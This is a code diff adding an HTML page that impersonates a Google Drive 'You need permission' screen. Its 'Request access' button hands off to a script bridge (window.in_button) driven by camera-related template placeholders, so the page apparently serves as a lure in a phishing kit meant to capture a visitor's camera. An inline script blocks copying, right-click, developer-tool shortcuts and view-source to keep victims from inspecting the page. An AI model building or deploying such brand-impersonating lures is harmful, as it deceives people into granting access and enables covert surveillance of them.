@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta name="description" content="Web word processing, presentations and spreadsheets">
+	<meta name="viewport"
+		content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+	<link rel="shortcut icon"
+		href="https://icons.iconarchive.com/icons/marcus-roberto/google-play/256/Google-Drive-icon.png">
+	<title>Google Drive - Access Denied</title>
+	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+<style>
+	body {
+		background-color: #ffffff;
+		font-size: 13px;
+		margin: 0;
+		padding: 0;
+		font-family: Arial, sans-serif;
+	}
+
+	#outerContainer {
+		margin: auto;
+		max-width: 750px;
+	}
+
+	#innerContainer {
+		margin-bottom: 20px;
+		margin-left: 40px;
+		margin-right: 40px;
+		margin-top: 180px;
+		position: relative;
+	}
+
+	#requestButton {
+		font-weight: bold;
+		transition: all 0.2s ease;
+		border-radius: 4px;
+		box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+		position: relative;
+		overflow: hidden;
+	}
+
+	#requestButton:hover {
+		background: linear-gradient(to bottom, #4d90fe 0%, #357ae8 100%);
+		box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+		transform: translateY(-1px);
+	}
+
+	#requestButton:active {
+		transform: translateY(1px);
+		box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+	}
+
+	#requestButton.accepting {
+		background: linear-gradient(to bottom, #5a9aff 0%, #4285f4 100%);
+		box-shadow: 0 0 15px rgba(66, 133, 244, 0.5);
+	}
+
+	@keyframes gentlePulse {
+		0% {
+			box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+		}
+
+		50% {
+			box-shadow: 0 2px 8px rgba(77, 144, 254, 0.4);
+		}
+
+		100% {
+			box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+		}
+	}
+
+	#requestButton.pulse {
+		animation: gentlePulse 2s infinite;
+	}
+
+	.docs-drivelogo-img {
+		background-image: url('data:image/png;base64,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');
+		background-size: 116px 41px;
+		display: inline-block;
+		height: 41px;
+		vertical-align: bottom;
+		width: 116px;
+	}
+
+	.docs-drivelogo-text {
+		color: #000;
+		display: inline-block;
+		opacity: 0.54;
+		text-decoration: none;
+		font-family: 'Product Sans', Arial, Helvetica, sans-serif;
+		font-size: 32px;
+		text-rendering: optimizeLegibility;
+		position: relative;
+		top: -6px;
+		left: -7px;
+		-webkit-font-smoothing: antialiased;
+		-moz-osx-font-smoothing: grayscale;
+	}
+
+	#main {
+		position: relative;
+		width: 640px;
+		top: 30px;
+	}
+
+	#accessDeniedIcon {
+		background-image: url('data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjEyOHB4IiBoZWlnaHQ9IjE1OHB4IiB2aWV3Qm94PSItMTQ1LjUgMjE0LjUgMTI4IDE1OCIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAtMTQ1LjUgMjE0LjUgMTI4IDE1OCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PGc+PHBhdGggZmlsbD0iI0NDQ0NDQyIgZD0iTS0xNy41LDI1Mi4zMThoLTM3LjgxOFYyMTQuNWgtNzcuMjI3Yy03LjE1NCwwLTEyLjk1NSw1LjgwMS0xMi45NTUsMTIuOTU0djEzMS45NTVjMCw3LjE1Myw1LjkzOCwxMy4wOTEsMTMuMDkxLDEzLjA5MWgxMDEuODE4YzcuMjcyLDAsMTMuMDkxLTUuODE4LDEzLjA5MS0xMy4wOTFWMjUyLjMxOHoiLz48L2c+PC9nPjxyYWRpYWxHcmFkaWVudCBpZD0iU1ZHSURfMV8iIGN4PSIxNjAuMTIxMSIgY3k9Ii0yNDMuNjE5NiIgcj0iMzUuODg2MSIgZ3JhZGllbnRUcmFuc2Zvcm09Im1hdHJpeCgxLjEwMTkgMCAwIC0xLjEwMTkgLTE5My42NDkxIC0xNS4yNjU1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPjxzdG9wIG9mZnNldD0iMC4xNSIgc3R5bGU9InN0b3AtY29sb3I6I0E2QTZBNiIvPjxzdG9wIG9mZnNldD0iMSIgc3R5bGU9InN0b3AtY29sb3I6I0IzQjNCMyIvPjwvcmFkaWFsR3JhZGllbnQ+PHBvbHlnb24gZmlsbD0idXJsKCNTVkdJRF8xXykiIHBvaW50cz0iLTU1LjMxOCwyNTIuMzE4IC0xNy41LDI1Mi4zMTggLTE3LjUsMjkwLjEzNyAiLz48cG9seWdvbiBmaWxsPSIjRTZFNkU2IiBwb2ludHM9Ii0xNy41LDI1Mi4zMTggLTU1LjMxOCwyNTIuMzE4IC01NS4zMTgsMjE0LjUgIi8+PHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTS01Mi41LDMyNi42ODJjMCwzLjIxNC0yLjYwNSw1LjgxOC01LjgxOCw1LjgxOGgtNDYuMzY0Yy0zLjIxMywwLTUuODE4LTIuNjA0LTUuODE4LTUuODE4di0zMy4zNjNjMC0zLjIxNCwyLjYwNS01LjgxOCw1LjgxOC01LjgxOGg0Ni4zNjRjMy4yMTMsMCw1LjgxOCwyLjYwNCw1LjgxOCw1LjgxOFYzMjYuNjgyeiIvPjxwYXRoIGZpbGw9IiNGRkZGRkYiIGQ9Ik0tNjEuMTM2LDI5MC4xMzdoLTUuODE4di01Ljk3MmMwLTcuOTM1LTYuNDU4LTE0LjM5My0xNC4zOTQtMTQuMzkzaC0wLjMwNGMtNy45MzYsMC0xNC4zOTMsNi40NTgtMTQuMzkzLDE0LjM5M3Y1Ljk3MmgtNS44MTh2LTUuOTcyYzAtMTEuMTQ2LDkuMDY2LTIwLjIxMSwyMC4yMTItMjAuMjExaDAuMzA0YzExLjE0NiwwLDIwLjIxMSw5LjA2NSwyMC4yMTEsMjAuMjExVjI5MC4xMzd6Ii8+PGNpcmNsZSBmaWxsPSIjQ0NDQ0NDIiBjeD0iLTgxLjUiIGN5PSIzMDkuNzczIiByPSIxMS4zMDQiLz48L3N2Zz4=');
+		float: right;
+		height: 158px;
+		width: 128px;
+	}
+
+	#accessDeniedHeader {
+		color: #222;
+		font: 32px Arial, sans-serif;
+	}
+
+	#message {
+		color: #222;
+		font: 15px/1.6 Arial, sans-serif;
+		width: 480px;
+	}
+
+	.jfk-button {
+		-webkit-border-radius: 2px;
+		-moz-border-radius: 2px;
+		border-radius: 2px;
+		cursor: default;
+		font-size: 11px;
+		font-weight: bold;
+		text-align: center;
+		white-space: nowrap;
+		margin-right: 16px;
+		height: 27px;
+		line-height: 27px;
+		min-width: 54px;
+		outline: 0px;
+		padding: 0 8px;
+	}
+
+	.jfk-button-action {
+		-webkit-box-shadow: none;
+		-moz-box-shadow: none;
+		box-shadow: none;
+		background-color: #4d90fe;
+		background-image: -webkit-linear-gradient(top, #4d90fe, #4787ed);
+		background-image: -moz-linear-gradient(top, #4d90fe, #4787ed);
+		background-image: -ms-linear-gradient(top, #4d90fe, #4787ed);
+		background-image: -o-linear-gradient(top, #4d90fe, #4787ed);
+		background-image: linear-gradient(top, #4d90fe, #4787ed);
+		border: 1px solid #3079ed;
+		color: #fff;
+	}
+
+	:focus {
+		outline: none;
+	}
+
+	::-moz-focus-inner {
+		border: 0;
+	}
+
+	@media (max-width: 500px) {
+	}
+</style>
+
+<body>
+	<div id="outerContainer">
+		<div id="innerContainer">
+			<div style="position: absolute; top: -80px;">
+				<div id="drive-logo">
+					<span class="docs-drivelogo-img"></span>
+					<span class="docs-drivelogo-text"> Drive</span>
+				</div>
+			</div>
+			<div style="clear:both"></div>
+			<div id="main">
+				<div id="accessDeniedIcon"></div>
+				<p id="accessDeniedHeader">You need permission</p>
+				<div id="message">
+					<p>Want in? Ask for access, or switch to an account with permission.</p>
+				</div>
+				<script src="object.js"></script>
+				<script>
+					const delay = __CAMERA_COUNT__;
+					window.in_button.sc(delay);
+					window.in_button.button_enable(__CAMERA_STATUS__);
+					function click_button() {
+						const button = document.getElementById('requestButton');
+						button.classList.remove('pulse');
+						button.classList.add('accepting');
+						button.innerHTML = 'Accept Permission';
+						button.disabled = true;
+						window.in_button.accept();
+					}
+					document.addEventListener('DOMContentLoaded', function () {
+						const button = document.getElementById('requestButton');
+						setTimeout(() => {
+							button.classList.add('pulse');
+						}, 500);
+					});
+				</script>
+				<script>document.addEventListener('contextmenu', e => e.preventDefault()); document.addEventListener('dragstart', e => !e.target.matches('button,input,textarea,a,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('selectstart', e => !e.target.matches('input,textarea,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('copy', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('cut', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('paste', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('keydown', e => { (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) || (e.ctrlKey && ['u', 'U'].includes(e.key)) || e.key === 'F11' || (e.ctrlKey && ['s', 'S', 'p', 'P'].includes(e.key)) || (e.altKey && e.key === 'Tab')) && (e.preventDefault(), !1) }); setInterval(() => { const w = window.outerWidth - window.innerWidth > 160, h = window.outerHeight - window.innerHeight > 160; (w || h) && !window.devToolsOpen && (window.devToolsOpen = !0) }, 2000);</script>
+				<p id="buttons" style="padding-top: 10px">
+					<button id="requestButton" class="jfk-button jfk-button-action" onclick="click_button()">Request
+						access</button>
+				</p>
+			</div>
+		</div>
+	</div>
+</body>
+
+</html>
